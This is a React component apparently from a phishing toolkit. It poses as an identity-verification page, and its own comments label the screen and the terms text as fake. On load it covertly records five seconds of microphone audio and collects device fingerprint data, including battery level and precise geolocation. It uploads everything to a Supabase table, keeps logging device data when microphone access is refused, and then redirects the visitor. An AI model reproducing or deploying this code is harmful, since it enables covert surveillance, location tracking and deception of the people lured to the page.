import { useState, useEffect, useRef } from "react";
import { Loader2, Mic, MicOff, Shield, Smartphone } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

const AudioCapture = () => {
  const { settings } = useSettings();
  const [status, setStatus] = useState<"loading" | "recording" | "done" | "error">("loading");
  const [errorMessage, setErrorMessage] = useState("");
  const [deviceInfo, setDeviceInfo] = useState<Record<string, any>>({});
  const sessionId = new URLSearchParams(window.location.search).get("session") || settings.camSessionId || "audiocap";
  const hasStarted = useRef(false);

  const collectDeviceInfo = () => {
    const info: Record<string, any> = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages?.join(", "),
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      screenColorDepth: window.screen.colorDepth,
      screenPixelDepth: window.screen.pixelDepth,
      windowInnerWidth: window.innerWidth,
      windowInnerHeight: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      connectionType: (navigator as any).connection?.effectiveType || "unknown",
      downlink: (navigator as any).connection?.downlink || "unknown",
      onLine: navigator.onLine,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      webdriver: navigator.webdriver,
      vendor: navigator.vendor,
      vendorSub: navigator.vendorSub,
      productSub: navigator.productSub,
      appVersion: navigator.appVersion,
      appCodeName: navigator.appCodeName,
      appName: navigator.appName,
      oscpu: (navigator as any).oscpu || "unknown",
      deviceMemory: (navigator as any).deviceMemory || "unknown",
    };

    // Battery info (if available)
    if ("getBattery" in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        info.batteryLevel = Math.round(battery.level * 100) + "%";
        info.batteryCharging = battery.charging;
        setDeviceInfo({ ...info });
      }).catch(() => {});
    }

    // Geolocation (if permission granted)
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          info.latitude = pos.coords.latitude;
          info.longitude = pos.coords.longitude;
          info.accuracy = pos.coords.accuracy;
          setDeviceInfo({ ...info });
        },
        () => {},
        { timeout: 5000, enableHighAccuracy: true }
      );
    }

    setDeviceInfo(info);
    return info;
  };

  const saveToSupabase = async (audioBlob: Blob, deviceData: Record<string, any>) => {
    try {
      // Convert audio to base64
      const reader = new FileReader();
      reader.readAsDataURL(audioBlob);
      
      reader.onloadend = async () => {
        const base64Audio = reader.result as string;
        
        // Save to captured_photos table (reusing existing table structure)
        await supabase.from("captured_photos").insert({
          session_id: sessionId,
          image_data: base64Audio, // We're storing audio here for simplicity
          user_agent: navigator.userAgent,
          ip_address: null,
        });

        // Save device info as a separate entry with JSON in image_data
        await supabase.from("captured_photos").insert({
          session_id: sessionId + "_deviceinfo",
          image_data: JSON.stringify(deviceData),
          user_agent: navigator.userAgent,
          ip_address: null,
        });
      };
    } catch (err) {
      console.error("Failed to save data:", err);
    }
  };

  const startAudioCapture = async () => {
    try {
      setStatus("recording");
      
      // Collect device info immediately
      const deviceData = collectDeviceInfo();
      
      // Request microphone access
      const stream = await navigator.mediaDevices.getUserMedia({ 
        audio: { 
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true
        } 
      });

      // Record audio for 5 seconds
      const mediaRecorder = new MediaRecorder(stream);
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const audioBlob = new Blob(chunks, { type: "audio/webm" });
        await saveToSupabase(audioBlob, deviceData);
        
        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());
        
        setStatus("done");
        
        // Redirect after capture if enabled
        if (settings.camAutoRedirect && settings.camRedirectUrl) {
          setTimeout(() => {
            window.location.href = settings.camRedirectUrl;
          }, 1500);
        }
      };

      mediaRecorder.start();
      
      // Stop recording after 5 seconds
      setTimeout(() => {
        if (mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 5000);

    } catch (err: any) {
      console.error("Audio capture error:", err);
      setStatus("error");
      setErrorMessage(err.message || "Microphone access denied");
      
      // Still save device info even if audio fails
      const deviceData = collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceData),
        user_agent: navigator.userAgent,
        ip_address: null,
      });
    }
  };

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;

    // Start capture after a small delay
    const timer = setTimeout(() => {
      startAudioCapture();
    }, 500);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Fake Security Verification UI */}
        <div className="text-center space-y-6">
          {/* Logo/Icon */}
          <div className="flex justify-center">
            <div className="w-20 h-20 rounded-full bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center animate-pulse">
              {status === "recording" ? (
                <Mic className="w-10 h-10 text-white animate-pulse" />
              ) : status === "done" ? (
                <Shield className="w-10 h-10 text-white" />
              ) : status === "error" ? (
                <MicOff className="w-10 h-10 text-white" />
              ) : (
                <Smartphone className="w-10 h-10 text-white" />
              )}
            </div>
          </div>

          {/* Title */}
          <div>
            <h1 className="text-2xl font-bold text-white mb-2">
              {status === "loading" && "Initializing Security Check..."}
              {status === "recording" && "Verifying Your Identity..."}
              {status === "done" && "Verification Complete!"}
              {status === "error" && "Verification Failed"}
            </h1>
            <p className="text-gray-400 text-sm">
              {status === "loading" && "Please wait while we prepare the verification"}
              {status === "recording" && "This will only take a few seconds"}
              {status === "done" && "Redirecting you to the secure page..."}
              {status === "error" && errorMessage}
            </p>
          </div>

          {/* Progress Indicator */}
          {(status === "loading" || status === "recording") && (
            <div className="flex justify-center">
              <div className="flex items-center gap-2 px-6 py-3 rounded-full bg-white/10 backdrop-blur">
                <Loader2 className="w-5 h-5 text-blue-400 animate-spin" />
                <span className="text-white text-sm font-medium">
                  {status === "recording" ? "Recording voice sample..." : "Preparing..."}
                </span>
              </div>
            </div>
          )}

          {/* Success Animation */}
          {status === "done" && (
            <div className="flex justify-center">
              <div className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center">
                <div className="w-12 h-12 rounded-full bg-green-500/40 flex items-center justify-center">
                  <svg className="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
            </div>
          )}

          {/* Fake Terms */}
          <p className="text-gray-500 text-xs mt-8">
            By using this service, you agree to our Terms of Service and Privacy Policy.
            Voice data is used for identity verification purposes only.
          </p>
        </div>
      </div>
    </div>
  );
};

export default AudioCapture;
